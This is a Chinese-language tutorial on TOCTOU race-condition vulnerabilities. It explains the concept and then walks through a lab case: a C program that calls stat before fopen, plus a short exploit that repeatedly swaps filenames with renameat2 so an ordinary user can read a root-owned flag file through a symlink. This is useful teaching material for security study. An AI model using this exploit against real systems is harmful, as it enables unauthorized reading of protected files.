条件竞争漏洞

条件竞争漏洞(TOCTOU Race Condition)

1、原理

  • 多个线程同时访问同一个代码、变量、文件等没有进行锁操作或同步操作的场景中。

2、危害

  • 绕过数量限制
  • 文件上传漏洞
  • DOS攻击
  • 权限提升

3、触发条件

  • 两个以上的并发执行流
  • 并发流访问同一对象
  • 至少有一个控制流会改变竞争对象的状态

程序首先执行action1，然后执行action2，正常流程是程序在执行action2时，action1所产生的条件仍然是满足的。
但是由于程序的并发性，攻击者很有可能可以在action2 执行之前的这个短暂的时间差中破坏 action1 所产生的条件。这时候攻击者的操作与 action2 产生了条件竞争，所以可能会影响程序的执行效果。

4、案例

TOCTOU (Time-of-check Time-of-use) 指的是程序在使用资源（变量，内存，文件）前会对进行检查，但是在程序使用对应的资源前，该资源却被修改了。

Race Condition Enabling Link Following

Linux 中提供了两种对于文件的命名方式

  • 文件路径名
  • 文件描述符

但是，将这两种命名解析到相应对象上的方式有所不同

  • 文件路径名在解析的时候是通过传入的路径（文件名，硬链接，软连接）间接解析的，其传入的参数并不是相应文件的真实地址。
  • 文件描述符通过访问直接指向文件的指针来解析。

正是由于间接性，产生了上面我们所说的时间差。

以下面的代码为例子，程序在访问某个文件之前，会检查是否存在，判断文件的权限，之后会打开文件然后执行操作。但是如果在检查之后，真正使用文件之前，攻击者使用另一个程序(并发)将文件名替换，那么程序将访问错误的文件，就有可能造成提权，脏牛漏洞差不多也是这个原理。

readfile.c

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc,char *argv[]){
    FILE  *fd;
    char str[20];
    struct stat stat_data;
    if (stat(argv[1],&stat_data)<0) {           //获取文件信息
        printf("获取失败.\n");
    }

    if (stat_data.st_uid==0) {                  //验证权限
        printf("无权限\n");
        exit(1);
    }
        fd=fopen(argv[1],"r");                  //操作文件
        while (fgets(str,20,fd)!=NULL){
            printf("%s",str);
        }
        fclose(fd);
    return 0;
}

这里用的是stat函数，通过文件名去获取文件的stat结构，然后再判断文件的所有者，如果所有者不是root的话就打开它，这里从获取文件stat到读取并不是一步就能完成的，这两个操作有一定的时间差。

现在/tmp目录下存在三个文件

  • user.tmp 空文件
  • flag 软连接
  • readfile 可执行文件
root@kali:/tmp# ls -li user.tmp flag readfile

2228723 -rwxr-xr-x 1 root root 16976 4月  12 14:54 readfile
2228721 -rw-r--r-- 1 user user     0 4月  10 09:39 user.tmp

root@kali:/RaceCondition# ls -li flag
4194310 -rw-r--r-- 1 root root 12 4月   9 11:34 flag

假设现在传入的是/tmp/user.tmp文件（st_uid=1001），它的所有者是 user(uid=1001)，在执行完 stat(argv[1], &stat_data) 之后的那一个瞬间，我用另一个程序(并发)把 /tmp/flag （ /flag 的软链接 st_uid=1001） 重命名为 /tmp/user.tmp 这样的话，在 if 的检测中检查的是原本的那个 user.tmp 文件的 st_uid，而走到 fopen 的时候 argv[1] 虽然也是 /tmp/user.tmp 但是打开的却是原本的 /tmp/flag 文件，而这个文件是 /flag 的软链接，这样我们就能读出 /flag 的内容

这个需要快速操作，才能通过readfile这个程序读取到 /RaceCondition/flag （因为我们是普通用户不能直接读取 /RaceCondition/flag 文件)

exp

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}

这个程序实现交换文件名的功能
